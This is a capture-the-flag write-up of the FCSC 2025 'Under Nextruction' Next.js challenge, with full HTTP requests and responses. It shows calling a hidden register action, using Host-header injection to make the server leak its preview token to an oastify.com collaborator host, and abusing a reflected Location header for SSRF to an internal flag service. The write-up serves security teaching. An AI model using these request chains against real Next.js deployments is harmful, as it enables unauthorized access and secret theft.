---
title: "Nextruction [EN]| FCSC 2025"
date: 2025-04-26T12:00:00Z
description: "Here's a full writeup of the 'Under Nextruction' web challenge created by Mizu at FCSC 2025."
tags: ["nextjs", "ssrf"]
keywords: ["nextjs", "ssrf"]
---
[//]: <> (Wrote By Vozec 27/04/2025)
---

# Under Nextruction Challenge Writeup

## Introduction

In this challenge, we are exploring a Next.js web application, with a focus on exploitation using SSRF (Server-Side Request Forgery) and header manipulation:
- **Main Application:** [https://under-nextruction.fcsc.fr:2213](https://under-nextruction.fcsc.fr:2213)
  
The application features a separate service that stores a flag, which we need to retrieve:
  
```
services:
  under-nextruction-app:
    build: ./src/nextjs
    ports:
      - "8000:8000"
    environment:
      - FLAG_STORE_KEY=FAKE_KEY
      - JWT_SECRET=FAKE_SECRET
    restart: unless-stopped
  
  under-nextruction-flag:
    build: ./src/flag-store
    environment:
      - FLAG_STORE_KEY=FAKE_KEY
      - FLAG=FCSC{flag_placeholder}
    restart: unless-stopped
```
## Understanding the Flag Service

The flag service, written in Flask, returns a flag when the correct `X-Key` header is presented at the `/get_flag` endpoint:

```
from flask import Flask, request, jsonify
from os import environ
  
app = Flask(__name__)
  
@app.get("/get_flag")
def get_flag():
    if request.headers.get("X-Key") != environ.get("FLAG_STORE_KEY", "FAKE_KEY"):
        return jsonify({ "error": "Invalid X-Key value provided!" }, 403)
  
    return jsonify({ "flag": environ.get("FLAG") })
  
app.run("0.0.0.0", 5000)
```

## Next.js Configuration and Middleware

The Next.js application includes a middleware setup with particular features:
  
```
import { NextResponse } from "next/server";
import { verify } from "./lib/jwt";
  
const baseUrl = process.env.PUBLIC_BASE_URL || 'http://localhost:8000';
  
export async function middleware(request) {
    const parsedUrl = new URL(request.url);
    const sessionValue = request.cookies.get("session")?.value;
    const verifiedSession = await verify(sessionValue);
    if ((!sessionValue || !verifiedSession) && parsedUrl.pathname !== "/login") {
        return NextResponse.redirect(new URL(`${baseUrl}/login`, request.url));
    }
  
    if (parsedUrl.pathname.startsWith("/api/")) {
        const requestHeaders = new Headers(request.headers);
        requestHeaders.set("X-User", verifiedSession.username);
        return NextResponse.next({ headers: requestHeaders });
    }
    return NextResponse.next();
}
  
export const config = {
  matcher: [ "/", "/((?!_next|.*\\..*).+)" ],
};
```

### Key Points from Middleware
- The middleware requires a verified user session to access paths other than `/login`.
- It adds user-specific headers to API calls for paths starting with `/api/` to enable further processing.
- The `trustHostHeader` option is enabled in `next.config.mjs`, suggesting possible vulnerabilities via Host header manipulation.

## Gaining Access to Functionality

The application exposes `/login` but does not expose a `/register` endpoint. However, the backend supports a registration function that we need to exploit:

```
"use server"
  
import { cookies } from "next/headers";
import { redirect } from "next/navigation";
import { sign } from "../../lib/jwt";
  
const users = [];
const baseUrl = process.env.PUBLIC_BASE_URL || 'http://localhost:8000';
  
export async function login(prevState, formData) {
  const username = formData.get("username");
  const password = formData.get("password");
  
  if (!username || !password) {
    return { success: false, error: "Username and password are require." };
  }
  const user = users.find(u => u.username === username && u.password === password);
  if (!user) {
    return { success: false, error: "Invalid credentials." };
  }
  const token = await sign({ username: user.username });
  (await cookies()).set("session", token, {
    httpOnly: true,
    maxAge: 60 * 60 * 24, // 24 hours
    path: "/",
  });
  redirect(`${baseUrl}/`);
}
  
export async function register(prevState, formData) {
  const username = formData.get("username");
  const password = formData.get("password");
  if (!username || !password || username.trim() === "" || password.trim() === "") {
    return { success: false, error: "Username and password are required." };
  }
  if (users.some(user => user.username === username)) {
    return { success: false, error: "Username already exists." };
  }
  
  if (password.length < 10) {
    return { success: false, error: "Password must be at least 10 chars long." };
  }
  users.push({ username, password });
  return { success: true };
}
```

The code above confirms the presence of a registration capability. 
In Next.js, both server and client-side actions are defined in JavaScript modules. These modules can be hosted on pages or within components that implement certain business logic. In this challenge, we're specifically dealing with the login and registration functionalities defined on the server side. 

The `actions.js` file is responsible for handling user login and registration. Here's a closer look at the registration and login functions included in `actions.js`:

```js
"use server"

import { cookies } from "next/headers";
import { redirect } from "next/navigation";
import { sign } from "../../lib/jwt";

const users = [];
const baseUrl = process.env.PUBLIC_BASE_URL || 'http://localhost:8000';

export async function login(prevState, formData) {
  const username = formData.get("username");
  const password = formData.get("password");
  
  if (!username || !password) {
    return { success: false, error: "Username and password are require." };
  }
  const user = users.find(u => u.username === username && u.password === password);
  if (!user) {
    return { success: false, error: "Invalid credentials." };
  }
  const token = await sign({ username: user.username });
  (await cookies()).set("session", token, {
    httpOnly: true,
    maxAge: 60 * 60 * 24, // 24 hours
    path: "/",
  });
  redirect(`${baseUrl}/`);
}

export async function register(prevState, formData) {
  const username = formData.get("username");
  const password = formData.get("password");
  if (!username || !password || username.trim() === "" || password.trim() === "") {
    return { success: false, error: "Username and password are required." };
  }
  if (users.some(user => user.username === username)) {
    return { success: false, error: "Username already exists." };
  }
  
  if (password.length < 10) {
    return { success: false, error: "Password must be at least 10 chars long." };
  }
  users.push({ username, password });
  return { success: true };
}
```

The **register** function enables creating a new user but the corresponding UI for registration isn't directly accessible through normal navigation on the page. When inspecting the JavaScript sources loaded by the page, you may notice code constructs like: 

```js
let n = (0, l.createServerReference)("606a919935d7a58f741d3b37dfcdb8df0239d8be02", l.callServer, void 0, l.findSourceMapURL, "login");
let a = (0, l.createServerReference)("60119a0e16f4930d77814c521045541c804c123986", l.callServer, void 0, l.findSourceMapURL, "register");
```
These constructs represent server references linked with specific actions, such as login and register. 

## Modifying the Login Request for Account Creation

**Understanding the Next-Action Header **

The `Next-Action` header uses tokens associated with backend functions.
- 606a919935d7a58f741d3b37dfcdb8df0239d8be02: Corresponds to the login function.
- 60119a0e16f4930d77814c521045541c804c123986: Corresponds to the hidden register function.
     
To create a new account, we can modify an existing login request:
```
POST /login HTTP/2
Host: under-nextruction.fcsc.fr:2213
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/x-component
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://under-nextruction.fcsc.fr:2213/login
Next-Action: 606a919935d7a58f741d3b37dfcdb8df0239d8be02
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Flogin%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Content-Type: multipart/form-data; boundary=----geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Length: 998
Origin: https://under-nextruction.fcsc.fr:2213
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: blue
Priority: u=0
Te: trailers

------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_$ACTION_REF_1"


------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_$ACTION_1:0"

{"id":"606a919935d7a58f741d3b37dfcdb8df0239d8be02","bound":"$@1"}
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_$ACTION_1:1"

[{"success":false,"error":null}]
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_$ACTION_KEY"

k852555183
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_username"

vozec
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_password"

Vozec123!XXX
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="0"

[{"success":false,"error":null},"$K1"]
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff--
```


become: 

```
POST /login HTTP/2
Host: under-nextruction.fcsc.fr:2213
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/x-component
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://under-nextruction.fcsc.fr:2213/login
Next-Action: 60119a0e16f4930d77814c521045541c804c123986
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Flogin%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Content-Type: multipart/form-data; boundary=----geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Length: 998
Origin: https://under-nextruction.fcsc.fr:2213
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: blue
Priority: u=0
Te: trailers

------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_$ACTION_REF_1"


------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_$ACTION_1:0"

{"id":"606a919935d7a58f741d3b37dfcdb8df0239d8be02","bound":"$@1"}
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_$ACTION_1:1"

[{"success":false,"error":null}]
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_$ACTION_KEY"

k852555183
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_username"

vozec
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="1_password"

Vozec123!XXX
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff
Content-Disposition: form-data; name="0"

[{"success":false,"error":null},"$K1"]
------geckoformboundary52ee8d2f1fb48ea549e2e780d3661aff--
```

After the modification, the server interprets the request as an attempt to register an account rather than login. The presence of the backend registration function ensures that, despite no client-side form being available, the API endpoint processes account creation. 
Executing this change allows you to successfully register a new account on the platform: `vozec` / `Vozec123!XXX`

```json
0:{"a":"$@1","f":"","b":"c18-MFoC-fqxM_ozCO9Q-"}
1:{"success":true}
```

# Exploring API Endpoints 

As you interact with the application's backend, you discover two crucial API endpoints: 

- `/api/revalidate`
This endpoint's role is to refresh the cache of a particular page or the entire site. Here's the relevant code snippet: 
```js
export default async function handler(req, res) {
    try {
        await res.revalidate("/");
        return res.status(200).json({
            revalidated: true,
            timestamp: new Date().toISOString(),
            message: "Cache revalidated successfully",
        });
    } catch (err) {
        return res.status(500).json({
            revalidated: false,
            message: "Error revalidating cache",
            error: err.message,
        });
    }
}
```

- `/api/user`
This endpoint provides user information, including the *flagStoreKey*, but only if the system is in preview mode: 
```js
export default function handler(req, res) {
    if (!req.preview) {
        return res.status(403).json({
            error: "Must be in preview mode.",
            timestamp: new Date().toISOString(),
        });
    }
    const username = req.headers["x-user"];

    return res.status(200).json({
        username: username || null,
        timestamp: new Date().toISOString(),
        flagStoreKey: process.env.FLAG_STORE_KEY || "FAKE_KEY",
    });
}
```

We can try to directly access the `/api/user` endpoint with our session cookie: 
```http
GET /api/user HTTP/2
Host: under-nextruction.fcsc.fr:2213
Cookie: session=...
```

```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 75
Date: [Timestamp] 

{
  "error": "Must be in preview mode.",
  "timestamp": "2025-04-27T17:03:38.887Z"
}
```

## Gaining Preview Mode Access

To access certain sensitive API endpoints, we need to activate the preview mode within the application. According to Next.js documentation, preview mode can be enabled in two main ways:  
- By activating debug mode.
- By setting "Draft" mode.

These modes typically require server-side activation via the `res.setPreviewData({})` method. Unfortunately, upon reviewing the code, there appears to be no direct call to this method. [Reference: Next.js Preview Mode Documentation](https://nextjs.org/docs/pages/guides/preview-mode)

I identified the `/api/revalidate` endpoint, which allows cache revalidation of the page /. Its underlying code can be found in the Next.js GitHub repository: [Next.js GitHub](https://github.com/vercel/next.js/blob/e9982de2af9cbaa273bd8c73f07b6f9eb1d7cf68/packages/next/src/server/api-utils/node/api-resolver.ts#L249)

```js
async function revalidate(
  urlPath: string,
  opts: {
    unstable_onlyGenerated?: boolean
  },
  req: IncomingMessage,
  context: ApiContext
) {
  if (typeof urlPath !== 'string' || !urlPath.startsWith('/')) {
    throw new Error(
      `Invalid urlPath provided to revalidate(), must be a path e.g. /blog/post-1, received ${urlPath}`
    )
  }
  const revalidateHeaders: HeadersInit = {
    [PRERENDER_REVALIDATE_HEADER]: context.previewModeId,
    ...(opts.unstable_onlyGenerated
      ? {
          [PRERENDER_REVALIDATE_ONLY_GENERATED_HEADER]: '1',
        }
      : {}),
  }
  const allowedRevalidateHeaderKeys = [
    ...(context.allowedRevalidateHeaderKeys || []),
  ]

  if (context.trustHostHeader || context.dev) {
    allowedRevalidateHeaderKeys.push('cookie')
  }

  if (context.trustHostHeader) {
    allowedRevalidateHeaderKeys.push('x-vercel-protection-bypass')
  }

  for (const key of Object.keys(req.headers)) {
    if (allowedRevalidateHeaderKeys.includes(key)) {
      revalidateHeaders[key] = req.headers[key] as string
    }
  }

  const internalRevalidate =
    routerServerGlobal[RouterServerContextSymbol]?.revalidate

  try {
    // We use the revalidate in router-server if available.
    // If we are operating without router-server (serverless)
    // we must go through network layer with fetch request
    if (internalRevalidate) {
      return await internalRevalidate({
        urlPath,
        revalidateHeaders,
        opts,
      })
    }

    if (context.trustHostHeader) {
      const res = await fetch(`https://${req.headers.host}${urlPath}`, {
        method: 'HEAD',
        headers: revalidateHeaders,
      })
      // we use the cache header to determine successful revalidate as
      // a non-200 status code can be returned from a successful revalidate
      // e.g. notFound: true returns 404 status code but is successful
      const cacheHeader =
        res.headers.get('x-vercel-cache') || res.headers.get('x-nextjs-cache')

      if (
        cacheHeader?.toUpperCase() !== 'REVALIDATED' &&
        res.status !== 200 &&
        !(res.status === 404 && opts.unstable_onlyGenerated)
      ) {
        throw new Error(`Invalid response ${res.status}`)
      }
    } else {
      throw new Error(
        `Invariant: missing internal router-server-methods this is an internal bug`
      )
    }
  } catch (err: unknown) {
    throw new Error(
      `Failed to revalidate ${urlPath}: ${isError(err) ? err.message : err}`
    )
  }
}
```

The code checks for whether the application is in preview mode by examining the presence of a specific header, `x-prerender-revalidate`. The presence of this header is crucial for activating debug mode, granting deeper insight into the application's operations. 

Interestingly, further inspection of the code reveals:
```js
if (context.trustHostHeader) {
    const res = await fetch(https://${req.headers.host}${urlPath}, {
    method: 'HEAD',
    headers: revalidateHeaders,
    })
    const cacheHeader =
    res.headers.get('x-vercel-cache') || res.headers.get('x-nextjs-cache')
    ...
```

When **trustHostHeader** is enabled, the server executes a fetch **using the Host header** to construct the URL, incorporating the revalidateHeaders. This behavior opens a potential avenue for HEAD SSRF through Host header injection !

By issuing the following request, we can redirect internal requests and capture responses containing a valid token for debug mode:  

```
GET /api/revalidate HTTP/2
Host: awariwppl8klbxf0rubkq5tfl6rxfn3c.oastify.com
Cookie: session=...
```

This request results in the server performing a HEAD request to the specified Host, allowing interception and retrieval of the x-prerender-revalidate token:

```http
HEAD / HTTP/1.1
host: awariwppl8klbxf0rubkq5tfl6rxfn3c.oastify.com
connection: close
x-prerender-revalidate: 59c6709a1c2b39386a72b0026399960b
cookie: session=...
accept: / 
accept-language: *
sec-fetch-mode: cors
user-agent: node
accept-encoding: br, gzip, deflate
```

With the obtained token, you can modify the request to include the `__prerender_bypass` cookie: 
```http
GET /api/user HTTP/2
Host: under-nextruction.fcsc.fr:2213
Cookie: session= ...;__prerender_bypass=59c6709a1c2b39386a72b0026399960b
```

Resulting in:

```http
HTTP/2 200 OK
Cookie: session=...;__prerender_bypass=59c6709a1c2b39386a72b0026399960b
Host: under-nextruction.fcsc.fr:2213
X-Forwarded-For: 212.114.18.5
X-Forwarded-Host: under-nextruction.fcsc.fr:2213
X-Forwarded-Port: 8000
X-Forwarded-Proto: http
X-User: Vozec
Content-Type: application/json; charset=utf-8
Etag: "11a0v165edf3x"
Content-Length: 141
Vary: Accept-Encoding
Date: Sun, 27 Apr 2025 17:01:27 GMT
X-Robots-Tag: noindex, nofollow, nosnippet, noarchive, nocache, noodp, noyaca
{"username":"Vozec","timestamp":"2025-04-27T17:01:27.222Z","flagStoreKey":"8fce97b0137965a3ddd635355eb3b1d249844c814c7981ade10dc201a329b457"}
```

### SSRF: Exploiting Header Reflection 

After obtaining the key, the next task is to execute SSRF on the Python application hosting the flag.   
An interesting and exploitable behavior was identified in the API: **Any headers sent in the request are mirrored back in the response!**

```http
GET /api/user HTTP/2
Host: under-nextruction.fcsc.fr:2213
Cookie: session=...;
Test: TEST
```

Response: 
```http
HTTP/2 403 Forbidden
Cookie: session=...;
Host: under-nextruction.fcsc.fr:2213
Test: TEST
[SNIPPED]

{"error":"Must be in preview mode.","timestamp":"2025-04-27T17:03:38.887Z"}
```

This reflection is due to the middleware setup:

```js
if (parsedUrl.pathname.startsWith("/api/")) {
    const requestHeaders = new Headers(request.headers);
    requestHeaders.set("X-User", verifiedSession.username);
    return NextResponse.next({ headers: requestHeaders });
}
```

Although this piece of code initially seems harmless, it introduces a significant security risk: 
By copying all incoming request headers to `NextResponse.next`, there's a duplication of previously processed headers. Such replication can be exploited, particularly with headers already interpreted by the backend, leading to unintended behaviors !

The most potent header injection is using the `Location` header. The `NextResponse.next` attempts to resolve any location specified within the Location header, thus opening a vector for SSRF.

By manipulating the `Location` header, requests can traverse internal networks: 

```
GET /api/user HTTP/2
Host: under-nextruction.fcsc.fr:2213
Cookie: session=...;
Location: http://under-nextruction-flag:5000/get_flag
```

Response: 
```json
[{"error":"Invalid X-Key value provided!"},403]
```

By correctly appending the API key, access to the intended resources is enabled:  
```http
GET /api/user HTTP/2
Host: under-nextruction.fcsc.fr:2213
Cookie: session=...;
Location: http://under-nextruction-flag:5000/get_flag 
X-Key: 8fce97b0137965a3ddd635355eb3b1d249844c814c7981ade10dc201a329b457
```

Successful Flag Retrieval: 
```json
{"flag":"FCSC{b2eac9d3dfbf0de3053beb63edec23df41b103c58a18b811ebd52d372d6f0cad}"}
```